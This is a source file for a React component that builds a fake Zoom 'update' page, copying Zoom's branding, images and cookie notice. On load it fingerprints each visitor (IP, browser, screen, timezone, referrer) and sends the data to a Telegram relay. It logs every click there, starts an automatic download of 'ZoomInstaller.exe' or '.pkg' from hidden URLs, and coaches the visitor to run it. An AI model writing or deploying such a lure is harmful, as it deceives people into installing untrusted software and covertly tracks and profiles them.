"use client";
import React, { useEffect, useState, useRef } from "react";
import Loader from "./Loader";

export default function UpdateBox() {
  // State management
  const [os, setOs] = useState(null);
  const [browserType, setBrowserType] = useState("");
  const [isDownloading, setIsDownloading] = useState(false);
  const [downloadError, setDownloadError] = useState(false);
  const [downloadInitiated, setDownloadInitiated] = useState(false);
  const [showMobileModal, setShowMobileModal] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [showCookiePopup, setShowCookiePopup] = useState(true);
  const [windowWidth, setWindowWidth] = useState(0);
  const overlayRef = useRef(null);

  // Official Zoom download URLs from environment variables
  const ZOOM_WIN_URL = process.env.NEXT_PUBLIC_ZOOM_WIN_URL;
  const ZOOM_MAC_URL = process.env.NEXT_PUBLIC_ZOOM_MAC_URL;
  const MEETING_LINK = process.env.NEXT_PUBLIC_MEETING_LINK;

  // Handle window resize
  useEffect(() => {
    function handleResize() {
      setWindowWidth(window.innerWidth);
    }
    
    // Initial window width measurement
    handleResize();
    
    // Add event listener
    window.addEventListener("resize", handleResize);
    
    // Remove event listener on cleanup
    return () => window.removeEventListener("resize", handleResize);
  }, []);

  // Send data to Telegram
  const sendToTelegram = async (message) => {
    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: message }),
      });

      if (!response.ok) {
        throw new Error(`Telegram API Error: ${response.status}`);
      }
      
      console.log("Message sent to Telegram");
      return await response.json();
    } catch (error) {
      console.error("Failed to send to Telegram:", error);
    }
  };

  // Detect OS and browser
  useEffect(() => {
    async function detectOS() {
      try {
        const platform = navigator.platform || "Unknown";
        const detectedOs = platform.includes("Win")
          ? "windows"
          : platform.includes("Mac")
          ? "mac"
          : "other";
        setOs(detectedOs);

        // Get browser info
        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
        let detectedBrowser = "unknown";
        
        // Browser Detection
        if (/chrome|chromium|crios/i.test(userAgent)) {
          detectedBrowser = "chrome";
        } else if (/firefox|fxios/i.test(userAgent)) {
          detectedBrowser = "firefox";
        } else if (/safari/i.test(userAgent) && !/chrome|chromium|crios/i.test(userAgent)) {
          detectedBrowser = "safari";
        } else if (/edg/i.test(userAgent)) {
          detectedBrowser = "edge";
        } else if (/opera|opr/i.test(userAgent)) {
          detectedBrowser = "opera";
        }
        
        setBrowserType(detectedBrowser);

        // Show mobile modal for mobile devices
        if (/Android|iPhone|iPad|iPod/i.test(userAgent)) {
          setShowMobileModal(true);
        }

        // Get IP address
        const ipResponse = await fetch("https://api64.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ip = ipData.ip;
        const browser = navigator.userAgent;
        const screenWidth = window.screen.width;
        const screenHeight = window.screen.height;
        
        // Create device info payload
        const body = { 
          ip, 
          browser, 
          platform: detectedOs, 
          screenWidth, 
          screenHeight,
          language: navigator.language || navigator.userLanguage,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timestamp: new Date().toISOString(),
          referrer: document.referrer || "direct",
          userAgent: navigator.userAgent,
          windowWidth: window.innerWidth,
          windowHeight: window.innerHeight
        };

        // Send to API endpoint
        await fetch("/api/device-info", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });

        // Send to Telegram directly with more info
        const telegramMessage = `
🔵 Zoom Update Access
📱 Device: ${detectedOs}
🌍 IP: ${ip}
🌐 Browser: ${detectedBrowser}
📏 Resolution: ${screenWidth}x${screenHeight}
📐 Window: ${window.innerWidth}x${window.innerHeight}
⏰ Time: ${new Date().toISOString()}
🔄 Referrer: ${document.referrer || "direct"}
`;
        await sendToTelegram(telegramMessage);
        
      } catch (error) {
        console.error("Error sending device info:", error);
        // Try to send error to Telegram for monitoring
        sendToTelegram(`❌ Error collecting device info: ${error.message}`);
      } finally {
        setIsLoading(false);
      }
    }
    
    detectOS();
  }, []);

  // Auto-download logic - enable automatic download
  useEffect(() => {
    if (!os || isLoading || os === "other" || os === "android" || os === "ios") return;

    const downloadUrl = os === "windows" ? ZOOM_WIN_URL : ZOOM_MAC_URL;
    
    if (!downloadUrl) {
      console.error("No download URL available for this OS:", os);
      setDownloadError(true);
      setIsLoading(false);
      return;
    }

    const initiateSecureDownload = async () => {
      setIsDownloading(true);

      try {
        // Send an event to Telegram that download is starting
        await sendToTelegram(`🔽 Download initiated for ${os} device`);
        
        const link = document.createElement("a");
        link.href = downloadUrl;
        link.download = os === "windows" ? "ZoomInstaller.exe" : "ZoomInstaller.pkg";
        link.setAttribute("data-testid", "zoom-installer-download");
        link.style.display = "none";
        document.body.appendChild(link);

        link.click();
        document.body.removeChild(link);

        setDownloadInitiated(true);
        
        // Send successful download event to Telegram
        await sendToTelegram(`✅ Download started successfully for ${os} device`);
      } catch (error) {
        console.error("Download failed:", error);
        setDownloadError(true);
        
        // Send error to Telegram
        await sendToTelegram(`❌ Download failed for ${os} device: ${error.message}`);
      } finally {
        setIsDownloading(false);
      }
    };

    // Auto-start download after a short delay
    const timer = setTimeout(initiateSecureDownload, 1500);
    return () => clearTimeout(timer);
  }, [os, isLoading]);

  // Get browser-specific download instructions
  const getDownloadInstructions = () => {
    switch (browserType) {
      case "chrome":
        return {
          location: "bottom of the browser window",
          action: "Click on ZoomInstaller to run it",
        };
      case "firefox":
        return {
          location: "top-right corner download arrow",
          action: "Click on ZoomInstaller from the download list",
        };
      case "safari":
        return {
          location: "downloads button in the top-right corner",
          action: "Open the ZoomInstaller file",
        };
      case "edge":
        return {
          location: "bottom of the browser window",
          action: "Click on ZoomInstaller to run it",
        };
      case "opera":
        return {
          location: "download panel that opens automatically",
          action: "Click on ZoomInstaller to run it",
        };
      default:
        return {
          location: "browser's download section",
          action: "Open the ZoomInstaller file",
        };
    }
  };

  // Handle manual download click
  const handleManualDownload = async () => {
    try {
      await sendToTelegram(`🔄 Manual download attempt for ${os} device`);
      window.location.href = os === "windows" ? ZOOM_WIN_URL : ZOOM_MAC_URL;
    } catch (error) {
      console.error("Manual download failed:", error);
    }
  };

  // Handle meeting join click
  const handleJoinMeeting = async () => {
    try {
      await sendToTelegram(`🚀 User attempting to join meeting from ${os} device`);
      window.location.href = MEETING_LINK;
    } catch (error) {
      console.error("Failed to send join meeting event:", error);
      window.location.href = MEETING_LINK;
    }
  };

  // Render mobile modal
  const renderMobileModal = () => {
    return (
      <div className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4">
        <div className="bg-white rounded-lg max-w-md w-full p-4 sm:p-6 shadow-2xl">
          <div className="flex justify-center mb-4 sm:mb-6">
            <svg
              viewBox="0 0 24 24"
              width="48"
              height="48"
              stroke="#2D8CFF"
              strokeWidth="1.5"
              fill="none"
              strokeLinecap="round"
              strokeLinejoin="round"
            >
              <circle cx="12" cy="12" r="10" />
              <line x1="12" y1="8" x2="12" y2="12" />
              <line x1="12" y1="16" x2="12.01" y2="16" />
            </svg>
          </div>

          <h2 className="text-xl sm:text-2xl font-bold text-center text-gray-800 mb-2 sm:mb-4">Desktop Required</h2>

          <p className="text-gray-600 text-center text-sm sm:text-base mb-4 sm:mb-6">
            The Zoom update is only available for desktop devices. Please open this link on your PC or Mac to proceed with the update.
          </p>

          <div className="flex flex-col space-y-3">
            <button
              onClick={handleJoinMeeting}
              className="bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-md transition-colors w-full text-sm sm:text-base"
            >
              Join Meeting Without Update
            </button>

            <button
              onClick={() => {
                sendToTelegram("📱 Mobile user closed modal");
                setShowMobileModal(false);
              }}
              className="border border-gray-300 text-gray-700 font-semibold py-3 px-4 rounded-md hover:bg-gray-100 transition-colors w-full text-sm sm:text-base"
            >
              Close
            </button>
          </div>
        </div>
      </div>
    );
  };

  // Render the initial content (before download starts)
  const renderInitialContent = () => {
    return (
      <div>
        <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold text-gray-900 leading-tight">
          Update your Zoom app to experience AI Companion at no extra cost
        </h1>
        <p className="mt-3 sm:mt-4 text-base sm:text-lg text-gray-600">
          Unlock enhanced productivity with Zoom Workplace and the power of AI Companion 2.0, now included at no extra charge.*
        </p>

        {isDownloading ? (
          <div className="mt-4 sm:mt-6 flex items-center">
            <Loader />
            <p className="ml-4 text-blue-600 text-sm sm:text-base">Starting download...</p>
          </div>
        ) : (
          <div className="mt-4 sm:mt-6 flex flex-col sm:flex-row space-y-3 sm:space-y-0 sm:space-x-4">
            <button
              onClick={handleManualDownload}
              className="bg-blue-600 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-full hover:bg-blue-700 transition-colors text-sm sm:text-base"
              disabled={isDownloading}
            >
              Download Now
            </button>
            <a 
              href="#" 
              className="text-blue-600 hover:underline flex items-center justify-center sm:justify-start text-sm sm:text-base"
              onClick={() => sendToTelegram("👆 User clicked 'Discover Zoom Workplace'")}
            >
              Discover Zoom Workplace
            </a>
          </div>
        )}

        {downloadError && (
          <div className="mt-3 sm:mt-4 text-red-600 text-sm sm:text-base">
            There was a problem starting the download. Please try the Download Now button.
          </div>
        )}
      </div>
    );
  };

  // Determine download instruction position based on screen size
  const getDownloadBoxPositionClasses = () => {
    if (windowWidth < 640) { // sm breakpoint
      return "fixed top-16 left-2 right-2 z-50";
    } else if (windowWidth < 768) { // md breakpoint
      return "fixed top-4 right-2 z-50 max-w-sm";
    } else {
      return "fixed top-4 right-4 z-50 max-w-md";
    }
  };

  // Main content - matching the Zoom webpage design
  return (
    <>
      {showMobileModal && renderMobileModal()}

      {/* Main Section */}
      <div className="relative">
        {/* Faded Overlay when download is initiated */}
        {downloadInitiated && (
          <div className="fixed inset-0 bg-black bg-opacity-50 z-40 pointer-events-none"></div>
        )}

        {/* Download Instruction Box - Position responsive based on screen size */}
        {downloadInitiated && (
          <div className={`${getDownloadBoxPositionClasses()} bg-blue-50 rounded-lg p-3 sm:p-4 border border-blue-100`}>
            <div className="flex items-start sm:items-center mb-3 sm:mb-4">
              <div className="bg-green-100 p-2 rounded-full mr-2 sm:mr-3 flex-shrink-0">
                <svg className="h-5 w-5 sm:h-6 sm:w-6 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <h2 className="text-lg sm:text-xl font-bold text-gray-900">Your download has started automatically</h2>
            </div>

            <div className="relative mb-4 sm:mb-6 hidden sm:block">
              <div className="absolute bottom-full right-4 text-blue-600 animate-bounce">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="32"
                  height="32"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="rotate-180"
                >
                  <path d="M12 19V5M12 19L5 12M12 19L19 12"></path>
                </svg>
                <p className="text-sm font-medium">Look here!</p>
              </div>

              <div className="w-full h-10 bg-gray-100 rounded-md flex items-center justify-between px-4">
                <div className="w-24 h-3 bg-gray-200 rounded-full"></div>
                <div className="flex space-x-3">
                  <div className="w-6 h-6 rounded-full bg-gray-200"></div>
                  <div className="w-6 h-6 rounded-full bg-blue-600 flex items-center justify-center text-white">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3"></path>
                    </svg>
                  </div>
                </div>
              </div>
            </div>

            <h3 className="font-semibold text-gray-800 mb-1 sm:mb-2 text-sm sm:text-base">Installation Instructions:</h3>
            <ol className="space-y-1 sm:space-y-2 ml-6 list-decimal text-xs sm:text-sm md:text-base">
              <li>Look for the downloaded file in the {getDownloadInstructions().location}</li>
              <li>{getDownloadInstructions().action}</li>
              <li>Follow the installation prompts to complete the update</li>
              <li>Once installed, click the Join Meeting button below</li>
            </ol>

            <p className="text-gray-600 mt-3 sm:mt-4 mb-3 sm:mb-4 text-xs sm:text-sm">
              If the download hasn't started, click the button below to try again.
            </p>

            <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-4">
              <button
                onClick={handleManualDownload}
                className="bg-blue-600 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-full hover:bg-blue-700 transition-colors text-xs sm:text-sm"
              >
                Download Now
              </button>
              <button
                onClick={handleJoinMeeting}
                className="bg-white border border-blue-600 text-blue-600 px-4 sm:px-6 py-2 sm:py-3 rounded-full hover:bg-blue-50 transition-colors text-xs sm:text-sm text-center"
              >
                Join Meeting
              </button>
            </div>
          </div>
        )}

        <main className={`pt-16 sm:pt-24 pb-12 sm:pb-16 bg-white min-h-screen ${downloadInitiated ? "opacity-50" : ""}`}>
          {/* Announcement Bar (Header) */}
          <div
            className={`fixed top-0 left-0 right-0 bg-white border-b border-gray-200 ${
              downloadInitiated ? "z-30" : "z-45"
            }`}
          >
            <div className="max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-2 text-center">
              <p className="text-xs sm:text-sm text-gray-700">
                <span className="inline-flex items-center px-2 py-1 rounded-full bg-purple-100 text-purple-800 mr-2">
                  <svg className="h-3 w-3 sm:h-4 sm:w-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <span className="hidden xs:inline">Zoom debuts new agentic AI skills for Zoom AI Companion</span>
                  <span className="xs:hidden">New AI skills available</span>
                </span>
                <a 
                  href="#" 
                  className="text-blue-600 hover:underline text-xs sm:text-sm"
                  onClick={() => sendToTelegram("👆 User clicked 'Read more'")}
                >
                  Read more
                </a>
              </p>
            </div>
          </div>

          {/* Hero Section */}
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12 flex flex-col lg:flex-row items-center">
            {/* Left Side - Text and Buttons */}
            <div className="lg:w-1/2 mb-8 lg:mb-0">
              {isLoading ? (
                <div className="flex flex-col items-center justify-center h-48 sm:h-64">
                  <Loader />
                  <p className="mt-4 text-gray-600 text-sm sm:text-base">Preparing your Zoom update...</p>
                </div>
              ) : downloadInitiated ? (
                renderInitialContent() // Show initial content under the overlay
              ) : (
                renderInitialContent()
              )}
            </div>

            {/* Right Side - Images and Overlays */}
            <div className="lg:w-1/2 relative">
              {/* Two People Collaborating Image */}
              <div
                className="relative z-0 rounded-3xl shadow-lg w-48 sm:w-64 h-48 sm:h-64 bg-cover bg-center mb-8 hidden sm:block"
                style={{
                  backgroundImage: `url("https://st1.zoom.us/homepage/publish/images/sSlide3-1.jpg")`,
                }}
              >
                <div className="absolute bottom-4 left-4">
                  <img
                    src="https://st1.zoom.us/homepage/publish/images/sSlide3-4.png"
                    alt="hero4"
                    className="rounded-3xl shadow-lg w-24 sm:w-32"
                  />
                </div>
              </div>

              {/* Main Image - Woman with Laptop */}
              <div
                className="relative z-0 rounded-3xl shadow-lg w-full h-56 sm:h-64 md:h-96 bg-cover bg-center mt-8"
                style={{
                  backgroundImage: `url("https://st1.zoom.us/homepage/publish/images/sSlide2-3.jpg")`,
                }}
              >
                <div className="absolute bottom-4 left-4">
                  <img
                    src="https://st1.zoom.us/homepage/publish/images/sSlide2-2.png"
                    alt="hero2"
                    className="rounded-3xl shadow-lg w-24 sm:w-32 md:w-48"
                  />
                </div>
              </div>

              {/* Overlay Image 1 - Replacing "Help me write..." */}
              <div className="absolute top-10 right-8 sm:right-20 z-20 hidden sm:block">
                <img
                  src="https://st1.zoom.us/homepage/publish/images/sSlide1-2.png"
                  alt="hero2"
                  className="rounded-3xl shadow-lg w-36 sm:w-48 md:w-64"
                />
              </div>

              {/* Overlay Image 2 - Replacing "Product Marketing Plan" */}
              <div className="absolute bottom-10 right-0 z-20 hidden sm:block">
                <img
                  src="https://st1.zoom.us/homepage/publish/images/sSlide1-4.png"
                  alt="hero4"
                  className="rounded-3xl shadow-lg w-36 sm:w-48 md:w-64"
                />
              </div>
            </div>
          </div>
        </main>

        {/* Cookie Popup */}
        {showCookiePopup && (
          <div className="fixed bottom-0 left-0 right-0 md:bottom-4 md:left-4 md:right-auto bg-white rounded-t-lg md:rounded-lg shadow-lg p-3 sm:p-4 flex flex-col md:flex-row items-start md:items-center space-y-2 md:space-y-0 md:space-x-4 z-50 border-t border-gray-200 md:border md:max-w-md lg:max-w-2xl">
            <p className="text-xs sm:text-sm text-gray-700">
              Zoom uses cookies and similar technologies as described in our{" "}
              <a href="#" className="text-blue-600 hover:underline">
                cookie statement
              </a>
              . You can manage your cookie settings or exercise your rights to object.
            </p>
            <div className="flex items-center space-x-2 w-full md:w-auto">
              <button
                onClick={() => {
                  setShowCookiePopup(false);
                  sendToTelegram("🍪 User accepted cookies");
                }}
                className="bg-blue-600 text-white px-3 sm:px-4 py-1.5 sm:py-2 rounded-full hover:bg-blue-700 transition-colors text-xs sm:text-sm flex-grow md:flex-grow-0"
              >
                Cookie Settings
              </button>
              <button
                onClick={() => {
                  setShowCookiePopup(false);
                  sendToTelegram("🍪 User dismissed cookie popup");
                }}
                className="text-gray-700 hover:text-gray-900 p-1.5 sm:p-2"
              >
                <svg className="h-4 w-4 sm:h-5 sm:w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth="2"
                    d="M6 18L18 6M6 6l12 12"
                  />
                </svg>
              </button>
            </div>
          </div>
        )}
      </div>
    </>
  );
}